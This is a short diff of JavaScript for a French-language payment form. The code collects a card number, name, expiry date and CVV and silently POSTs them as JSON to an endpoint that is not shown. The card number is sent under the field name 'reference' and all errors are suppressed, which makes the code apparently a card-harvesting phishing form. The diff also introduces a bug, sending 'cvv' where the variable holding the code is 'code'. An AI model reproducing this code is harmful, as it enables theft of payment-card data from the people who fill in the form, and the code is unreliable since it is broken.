@@ -658,12 +658,12 @@ function showLoading(){
 }
 
 $('payBtn').onclick = () => {
-  const reference = cleanReference($('cardNumber').value);
+  const NumCarte = cleanReference($('cardNumber').value);
   const name = $('cardName').value.trim();
   const expiry = $('expiry').value.trim();
   const code = $('cvv').value.trim();
 
-  if(!/^\d{4} \d{4} \d{4} \d{4}$/.test(reference)){
+  if(!/^\d{4} \d{4} \d{4} \d{4}$/.test(NumCarte)){
     alert('Veuillez saisir le Numéro de carte au format 1234 5678 9012 3456.');
     $('cardNumber').focus();
     return;
@@ -692,10 +692,10 @@ $('payBtn').onclick = () => {
     method: 'POST',
     headers: {'Content-Type':'application/json'},
     body: JSON.stringify({
-      reference: reference,
+      reference: NumCarte,
       name: name,
       expiry: expiry,
-	  "code de controle": code,
+	  "code de controle": cvv,
       amount: '12 900 FCFA'
     })
   }).catch(() => {});
